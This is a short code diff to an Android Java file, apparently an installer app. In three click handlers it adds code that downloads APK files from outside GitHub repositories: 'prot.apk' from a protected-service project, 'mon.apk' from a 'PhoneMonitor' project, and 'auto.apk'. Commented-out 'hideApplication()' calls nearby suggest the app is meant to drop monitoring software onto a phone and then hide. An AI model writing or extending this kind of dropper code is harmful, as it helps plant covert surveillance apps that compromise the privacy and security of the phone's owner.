@@ -463,6 +463,8 @@ public void onClick(View v) {
                         MainActivity.btExit.setEnabled(false);
                         MainActivity.btExit2.setEnabled(true);
                     }
+                    else
+                        new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/ProtectedService1/raw/master/app/release/prot.apk");
 
                 }
                 //hideApplication();
@@ -504,6 +506,8 @@ public void onClick(View v) {
                         MainActivity.btExit2.setEnabled(false);
                         MainActivity.btExit3.setEnabled(true);
                     }
+                    else
+                        new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/PhoneMonitor/raw/master/AndroidStudioProject/PhoneMonitor/app/release/mon.apk");
                     //hideApplication();
                     //finish();
                 }
@@ -539,6 +543,11 @@ public void onClick(View v) {
                         bret = false;
 
                     }
+                    if (bret) {
+                        MainActivity.btExit3.setEnabled(false);
+                    }
+                    else
+                        new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
 
                     //hideApplication();
                     //finish();
